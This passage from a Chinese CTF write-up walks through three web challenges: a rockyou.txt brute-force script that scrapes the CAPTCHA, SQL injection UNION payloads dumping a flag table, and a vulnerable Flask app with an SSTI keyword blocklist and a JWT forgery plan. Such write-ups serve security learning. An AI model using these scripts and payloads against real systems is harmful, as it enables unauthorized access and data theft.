class="string">&quot;post&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;form-group&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;username&quot;</span>&gt;</span>用户名:<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">id</span>=<span class="string">&quot;username&quot;</span> <span class="attr">name</span>=<span class="string">&quot;username&quot;</span> <span class="attr">value</span>=<span class="string">&quot;admin&quot;</span> <span class="attr">required</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;form-group&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;password&quot;</span>&gt;</span>密码:<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;password&quot;</span> <span class="attr">id</span>=<span class="string">&quot;password&quot;</span> <span class="attr">name</span>=<span class="string">&quot;password&quot;</span> <span class="attr">required</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;form-group&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">label</span>&gt;</span>验证码:<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;captcha-images&quot;</span>&gt;</span></span><br><span class="line">                    </span><br><span class="line">                        <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;/static/captcha_images/6.png&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;captcha-digit&quot;</span>&gt;</span></span><br><span class="line">                    </span><br><span class="line">                        <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;/static/captcha_images/2.png&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;captcha-digit&quot;</span>&gt;</span></span><br><span class="line">                    </span><br><span class="line">                        <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;/static/captcha_images/1.png&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;captcha-digit&quot;</span>&gt;</span></span><br><span class="line">                    </span><br><span class="line">                        <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;/static/captcha_images/3.png&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;captcha-digit&quot;</span>&gt;</span></span><br><span class="line">                    </span><br><span class="line">                <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">id</span>=<span class="string">&quot;captcha&quot;</span> <span class="attr">name</span>=<span class="string">&quot;captcha&quot;</span> <span class="attr">required</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span>&gt;</span>登录<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>注意到body是这么写的，但其中验证码非常神奇，是由对应的数字对应上具体图片形成“验证码”，我们可以直接使用正则表达式把每次的验证码抓出来，事实上是形同虚设了。</p>
+<h3 id="试验登录逻辑：">试验登录逻辑：</h3>
+<p>我们不知道密码，但是这么一个可怜的本地网站可以直接爆破干穿。这里我们先试验一下登录的逻辑：</p>
+<ul>
+<li>在验证码正确但是密码错误的情况下，会返回账号或密码错误；</li>
+<li>在验证码错误，密码不知道（废话，知道我一会还爆破个蛋）的情况下，会返回验证码错误。</li>
+<li>试着抓一个包，然后发现，对于每次不同的验证码，在反复使用任意一次cookie的情况下，可以一直登录（后端没有机制杀掉老旧cookie）。感谢tsctf官方的wp（笑</li>
+</ul>
+<p>这样一来我们就可以放心的写一个爆破的简单脚本了。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re, requests</span><br><span class="line"></span><br><span class="line">URL = <span class="string">&quot;http://127.0.0.1:1000/login&quot;</span></span><br><span class="line">WORDLIST = <span class="string">&quot;/home/clolinux/rockyou.txt&quot;</span></span><br><span class="line"></span><br><span class="line">page = requests.get(URL, timeout=<span class="number">10</span>)</span><br><span class="line">cookie = page.cookies.get(<span class="string">&quot;session&quot;</span>)</span><br><span class="line">captcha = <span class="string">&quot;&quot;</span>.join(re.findall(<span class="string">r&quot;/static/captcha_images/(\d)\.png&quot;</span>, page.text))</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(WORDLIST, <span class="string">&quot;r&quot;</span>, encoding=<span class="string">&quot;latin-1&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">for</span> i, line <span class="keyword">in</span> <span class="built_in">enumerate</span>(f, <span class="number">1</span>):</span><br><span class="line">		pw = line.rstrip(<span class="string">&quot;\r\n&quot;</span>)</span><br><span class="line">		rr = requests.post(URL,</span><br><span class="line">                           data=&#123;<span class="string">&quot;username&quot;</span>: <span class="string">&quot;admin&quot;</span>,</span><br><span class="line">                                 <span class="string">&quot;password&quot;</span>: pw,          <span class="comment"># 修复③：真的把 pw 发出去</span></span><br><span class="line">                                 <span class="string">&quot;captcha&quot;</span>: captcha&#125;,     <span class="comment"># 修复⑤：带上 captcha</span></span><br><span class="line">                           cookies=&#123;<span class="string">&quot;session&quot;</span>: cookie&#125;, timeout=<span class="number">10</span>)</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> <span class="string">&quot;验证码错误&quot;</span> <span class="keyword">in</span> rr.text:</span><br><span class="line">            <span class="keyword">raise</span> SystemExit(<span class="string">f&quot;[-] 第 <span class="subst">&#123;i&#125;</span> 次请求验证码失效&quot;</span>)</span><br><span class="line">		<span class="keyword">if</span> <span class="string">&quot;用户名或密码错误&quot;</span> <span class="keyword">in</span> rr.text:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">		<span class="built_in">print</span>(<span class="string">f&quot;[+] 成功！password = <span class="subst">&#123;pw&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>
+<p>我们可以得到密码为simple，登录，发现：“<strong>你似乎不是本地管理员</strong>”。所以我们在请求里加入XFF即可，token里头就是一个没加密的flag。</p>
+<p>P.S：一些dsh的补充：</p>
+<blockquote>
+<p>验证码的安全价值不在&quot;图片长得难不难认&quot;，而在于<strong>答案是否只为服务端所知、且只用一次</strong>。这道题的图片连干扰线都懒得加，答案还是服务端亲手写成文字递过来的——它看起来像一道门，实际是一张贴在门上的钥匙。</p>
+<p><strong>无状态 Cookie 在原理上无法表达&quot;一次性&quot;</strong>。Cookie 能<strong>携带</strong>数据，不能<strong>消费</strong>数据——没有&quot;这个值已用过&quot;的概念。要一次性就必须有服务端状态（Redis 存 <code>sid→answer</code>，校验后 <code>DEL</code> + 过期）。</p>
+<p><strong>信息不只在页面里，也在响应头里</strong>。登录后页面&quot;啥也没有&quot;，但 <code>Set-Cookie</code> 里躺着 token。这是黑盒题的基本功：抓包看完整响应，不只盯渲染结果。</p>
+</blockquote>
+<h2 id="T2-ez-sql">T2-ez_sql</h2>
+<p>–updated on 9-27</p>
+<p>打开后发现是一个叫Vulnerability Database的玩意，反正根据题目来说就是一个sql注入。首先规规矩矩尝试1~8，发现是随便写了些web的具体漏洞。但是和flag没什么关系。但既然是sql，我们自然是先用原来那几步试试的好：</p>
+<p><code>1' #</code>   这个正常，说明可以带引号（事实上是下一个order by的时候，数字型没用</p>
+<p><code>1' Order by 3 ; #</code>  到4报错，说明就只有显示的那三行</p>
+<p><code>-1' UNION SELECT 111,schema_name,database()  from information_schema.schemata; #</code></p>
+<img src="/images/rt/tsctf-j-25/220202.png" style="zoom:43%;" />
+<p><code>-1' UNION SELECT 111,database(),table_name  from information_schema.tables where table_schema = database(); #</code></p>
+<img src="/images/rt/tsctf-j-25/220450.png" style="zoom:43%;" />
+<p><code>-1' UNION SELECT 111,database(),column_name  from information_schema.columns where table_schema = database() and table_name = &quot;flag&quot;; #</code></p>
+<img src="/images/rt/tsctf-j-25/220607.png" style="zoom:43%;" />
+<p>一直到这里都没什么问题，我们满怀期待地尝试<code>-1' union select 111, 222, flag from flag; #</code> 试图就此搞到flag。但是……</p>
+<p>但是到这里，发现union突然被ban了，怎么你之前就不ban😡</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">*No results found for ID: -1&#x27; union select 111, 222, flag from flag; #*</span><br><span class="line">Error: Illegal mix of collations for operation &#x27;UNION&#x27;</span><br></pre></td></tr></table></figure>
+<p>询问ds网页版老师，发现：</p>
+<blockquote>
+<p>你遇到的 <code>Illegal mix of collations for operation 'UNION'</code> 错误，核心原因是<strong>SQL语句中参与 <code>UNION</code> 查询的各列，其字符集（Collation）不一致，MySQL 无法决定用哪一个规则来合并结果</strong>。</p>
+<h3 id="🧐-为什么会报这个错？">🧐 为什么会报这个错？</h3>
+<p>在 SQL 注入中，你构造的 <code>-1' union select 111, 222, flag from flag; #</code> 会和原查询合并。原查询的列（如 <code>first_name</code>）有自己的字符集，而你注入的 <code>flag</code> 列或字符串常量 <code>111</code>、<code>222</code> 也可能有各自的字符集。当这些字符集不匹配时，<code>UNION</code> 操作就无法进行，从而抛出此错误。</p>
+<p>这在 <strong>DVWA</strong> 等靶场中很常见，因为靶场数据库的 <code>users</code> 表和 <code>information_schema</code> 等系统表的字符集可能不同（例如一个是 <code>utf8_general_ci</code>，另一个是 <code>utf8_unicode_ci</code>）</p>
+</blockquote>
+<p>改成<code>-1' union select 111, 222, CONVERT(flag using utf8) from flag; #</code> convert一下编码即可。</p>
+<h2 id="T3-ez-py">T3-ez_py</h2>
+<p>–updated on 9-28</p>
+<p>这题真的ez吗……好吧可能只是我太菜了。</p>
+<p>打开题目仍然是一个登陆页面，我们先查看源码，发现一个去/source的提示，之后得到一堆源码：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, jsonify, render_template_string</span><br><span class="line"><span class="keyword">from</span> functools <span class="keyword">import</span> wraps</span><br><span class="line"><span class="keyword">import</span> jwt</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>] = <span class="string">&#x27;&#x27;</span>.join(random.sample(string.ascii_letters + string.digits, <span class="number">24</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 用户数据库</span></span><br><span class="line">users = &#123;</span><br><span class="line">    <span class="string">&quot;c1432&quot;</span>: <span class="string">&quot;123456&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">make_response</span>(<span class="params">message: <span class="built_in">str</span>, code: <span class="built_in">int</span> = <span class="number">200</span>, data=<span class="literal">None</span></span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Unified response format</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    resp = &#123;<span class="string">&#x27;message&#x27;</span>: message&#125;</span><br><span class="line">    <span class="keyword">if</span> data <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">        resp[<span class="string">&#x27;data&#x27;</span>] = data</span><br><span class="line">    <span class="keyword">return</span> jsonify(resp), code</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">waf_filter</span>(<span class="params">input_str</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> input_str:</span><br><span class="line">        <span class="keyword">return</span> input_str</span><br><span class="line">    input_str = <span class="built_in">str</span>(input_str)</span><br><span class="line">    dangerous_strings = [</span><br><span class="line">        <span class="string">&#x27;class&#x27;</span>, <span class="string">&#x27;bases&#x27;</span>, <span class="string">&#x27;subclasses&#x27;</span>, <span class="string">&#x27;mro&#x27;</span>, <span class="string">&#x27;globals&#x27;</span>, <span class="string">&#x27;builtins&#x27;</span>, <span class="string">&#x27;import&#x27;</span>, <span class="string">&#x27;eval&#x27;</span>, </span><br><span class="line">        <span class="string">&#x27;exec&#x27;</span>, <span class="string">&#x27;open&#x27;</span>, <span class="string">&#x27;file&#x27;</span>, <span class="string">&#x27;read&#x27;</span>, <span class="string">&#x27;write&#x27;</span>, <span class="string">&#x27;os&#x27;</span>, <span class="string">&#x27;subprocess&#x27;</span>, <span class="string">&#x27;config&#x27;</span>, <span class="string">&#x27;request&#x27;</span>, </span><br><span class="line">        <span class="string">&#x27;session&#x27;</span>, <span class="string">&#x27;g&#x27;</span>, <span class="string">&#x27;url_for&#x27;</span>, <span class="string">&#x27;get_flashed_messages&#x27;</span>,<span class="string">&#x27;&#123;%&#x27;</span>, <span class="string">&#x27;%&#125;&#x27;</span>, <span class="string">&#x27;&#123;#&#x27;</span>, <span class="string">&#x27;#&#125;&#x27;</span>, <span class="string">&#x27;&#123;&#123;&#x27;</span>, <span class="string">&#x27;&#125;&#125;&#x27;</span></span><br><span class="line">    ]</span><br><span class="line">    <span class="keyword">for</span> string <span class="keyword">in</span> dangerous_strings:</span><br><span class="line">        <span class="keyword">if</span> string <span class="keyword">in</span> input_str:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;WAF blocked: Dangerous pattern detected&quot;</span></span><br><span class="line">    filtered = input_str.replace(<span class="string">&#x27;&lt;script&gt;&#x27;</span>, <span class="string">&#x27;&#x27;</span>).replace(<span class="string">&#x27;&lt;/script&gt;&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    filtered = filtered.replace(<span class="string">&#x27;javascript:&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    filtered = filtered.replace(<span class="string">&#x27;onload=&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    filtered = filtered.replace(<span class="string">&#x27;onerror=&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;hello&quot;</span> <span class="keyword">in</span> filtered:</span><br><span class="line">        filtered = filtered.replace(<span class="string">&quot;hello&quot;</span>, <span class="string">&quot;&#123;&#123;&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;hacker&quot;</span> <span class="keyword">in</span> filtered:</span><br><span class="line">        filtered = filtered.replace(<span class="string">&quot;hacker&quot;</span>, <span class="string">&quot;&#125;&#125;&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> filtered</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">User</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, role=<span class="string">&#x27;user&#x27;</span></span>):</span><br><span class="line">        <span class="variable language_">self</span>.username = <span class="literal">None</span></span><br><span class="line">        <span class="variable language_">self</span>.password = <span class="literal">None</span></span><br><span class="line">        <span class="variable language_">self</span>.role = role</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">merge</span>(<span class="params">src, dst</span>):</span><br><span class="line">    <span class="keyword">for</span> k, v <span class="keyword">in</span> src.items():</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">hasattr</span>(dst, <span class="string">&#x27;__getitem__&#x27;</span>):</span><br><span class="line">            <span class="keyword">if</span> dst.get(k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">                merge(v, dst.get(k))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                dst[k] = v</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">hasattr</span>(dst, k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">            merge(v, <span class="built_in">getattr</span>(dst, k))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">setattr</span>(dst, k, v)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">token_required</span>(<span class="params">f</span>):</span><br><span class="line"><span class="meta">    @wraps(<span class="params">f</span>)</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">decorated</span>(<span class="params">*args, **kwargs</span>):</span><br><span class="line">        token = request.headers.get(<span class="string">&#x27;Authorization&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> token:</span><br><span class="line">            <span class="keyword">return</span> make_response(<span class="string">&#x27;Authorization token is required.&#x27;</span>, <span class="number">401</span>)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            token = token.split(<span class="string">&quot; &quot;</span>)[<span class="number">1</span>]         <span class="comment"># 提取令牌，假设格式为 &#x27;Bearer &lt;token&gt;&#x27;</span></span><br><span class="line">            data = jwt.decode(token, app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>], algorithms=[<span class="string">&quot;HS256&quot;</span>])</span><br><span class="line">            current_user = data[<span class="string">&#x27;user&#x27;</span>]</span><br><span class="line">            role = data[<span class="string">&#x27;role&#x27;</span>]</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">return</span> make_response(<span class="string">f&#x27;Invalid token: <span class="subst">&#123;<span class="built_in">str</span>(e)&#125;</span>&#x27;</span>, <span class="number">401</span>)</span><br><span class="line">        <span class="keyword">return</span> f(current_user, role, *args, **kwargs)</span><br><span class="line">    <span class="keyword">return</span> decorated</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/register&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">register</span>():</span><br><span class="line">    data = request.json</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> data:</span><br><span class="line">        <span class="keyword">return</span> make_response(<span class="string">&#x27;Username and password are required.&#x27;</span>, <span class="number">400</span>)</span><br><span class="line">    user = User()</span><br><span class="line">    merge(data, user)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> user.username <span class="keyword">or</span> <span class="keyword">not</span> user.password:</span><br><span class="line">        <span class="keyword">return</span> make_response(<span class="string">&#x27;Username and password are required.&#x27;</span>, <span class="number">400</span>)</span><br><span class="line">    users[user.username] = user.password</span><br><span class="line">    <span class="keyword">return</span> make_response(<span class="string">&#x27;Registration successful.&#x27;</span>, <span class="number">201</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/login&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>():</span><br><span class="line">    auth = request.json</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> auth:</span><br><span class="line">        <span class="keyword">return</span> make_response(<span class="string">&#x27;Username and password are required.&#x27;</span>, <span class="number">400</span>)</span><br><span class="line">    username = auth.get(<span class="string">&#x27;username&#x27;</span>)</span><br><span class="line">    password = auth.get(<span class="string">&#x27;password&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> username <span class="keyword">or</span> <span class="keyword">not</span> password:</span><br><span class="line">        <span class="keyword">return</span> make_response(<span class="string">&#x27;Username and password are required.&#x27;</span>, <span class="number">400</span>)</span><br><span class="line">    <span class="keyword">if</span> users.get(username) != password:</span><br><span class="line">        <span class="keyword">return</span> make_response(<span class="string">&#x27;Invalid username or password.&#x27;</span>, <span class="number">401</span>)</span><br><span class="line">    token = jwt.encode(</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="string">&#x27;user&#x27;</span>: username,</span><br><span class="line">            <span class="string">&#x27;role&#x27;</span>: <span class="string">&#x27;user&#x27;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>],</span><br><span class="line">        algorithm=<span class="string">&quot;HS256&quot;</span></span><br><span class="line">    )</span><br><span class="line">    <span class="keyword">return</span> jsonify(&#123;<span class="string">&#x27;token&#x27;</span>: token&#125;)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/protected&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="meta">@token_required</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">protected</span>(<span class="params">current_user, role</span>):</span><br><span class="line">    <span class="keyword">if</span> role != <span class="string">&#x27;admin&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> make_response(<span class="string">f&#x27;Access denied: User <span class="subst">&#123;current_user&#125;</span> (<span class="subst">&#123;role&#125;</span>) does not have sufficient privileges.&#x27;</span>, <span class="number">403</span>)</span><br><span class="line">    filtered_user = waf_filter(current_user)</span><br><span class="line">    <span class="keyword">return</span> render_template_string(<span class="string">f&quot;Hello, <span class="subst">&#123;filtered_user&#125;</span>! You have access to this protected resource.&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;source/index.html&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">return</span> f.read()</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/register&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">register_page</span>():</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;source/register.html&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">return</span> f.read()</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/success&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">success_page</span>():</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;source/success.html&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">return</span> f.read()</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/source&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show_source</span>():</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(__file__, <span class="string">&#x27;r&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">return</span> f.read()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>)</span><br></pre></td></tr></table></figure>
+<p>看上去非常长。我们来简要分析一下：</p>
+<ol>
+<li>这段代码本质上仍然是一个flask应用，其中有位于app/config下的一个<strong>SECRET_KEY</strong>键值，看名字像是给JWT签名用的~~（问就是moe刚写过一个）~~</li>
+<li>后面有一段waf，里头屏蔽了一大堆关键字，这里先按下不表。但有注意到后面有对于hello hacker的后门，可以用这个替代被ban掉的两个花括号。</li>
+<li>注意到后面有一个令人开心的merge函数，虽然还不太能看懂它是怎么起作用的，但是根据<a target="_blank" rel="noopener" href="https://www.cnblogs.com/muciblog/articles/19897556">网上</a>的文章，这个函数的作用是进行一个递归合并，可以利用类似flask原型链污染的方法来污染下面的属性，是一个利用点。</li>
+<li>继续往下，在token_required这个函数里头，会通过读Authorization这个属性来获取令牌（Bearer）。</li>
+<li>而在访问/protected时，这时会调用token_required，然后比对里面的user和role，当role==admin时才会获得权限。但是这里直接使用了<code>&#123;filtered_user&#125;</code>作为模板显示，可以考虑在这里构造最终的payload，利用SSTI在这里执行命令，打印出flag。</li>
+</ol>
+<p>到这里，思路已经很明显了：为了利用这个SSTI获取flag，我们需要把这个token构造出来，那就需要获取签名 -&gt; 找出SECRET_KEY -&gt; 利用merge污染SECRET_KEY -&gt; 设法绕过WAF从而用这个密钥给payload签名。</p>
+<blockquote>
+<p>笔者在这里曾经尝试利用SSTI打出来config，从而暴露出SECRET_KEY。但是这是当时没理清楚思路的想法，结果看着看着发现要这么干就得先有token，属于一根筋两头堵的问题，思索良久后询问LLM才知道可以污染它…</p>
+</blockquote>
+<p>我们先不管waf，构造如下payload：</p>
